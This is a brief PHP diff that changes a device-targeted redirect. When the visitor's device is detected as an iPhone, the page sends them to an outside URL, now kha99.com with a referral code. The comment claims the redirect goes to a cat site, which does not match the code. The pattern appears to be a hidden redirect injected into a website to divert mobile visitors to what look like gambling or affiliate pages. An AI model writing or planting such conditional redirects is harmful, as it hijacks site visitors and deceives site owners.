@@ -62,7 +62,7 @@ function isIphone() {
 
 if (isIphone()) {
     // Redirect ke situs kucing.com jika perangkat adalah iPhone
-    header("Location: https://colokangka.com/ampku/");
+    header("Location: https://www.kha99.com/?rc=kha99vip1");
     exit();
 }
 
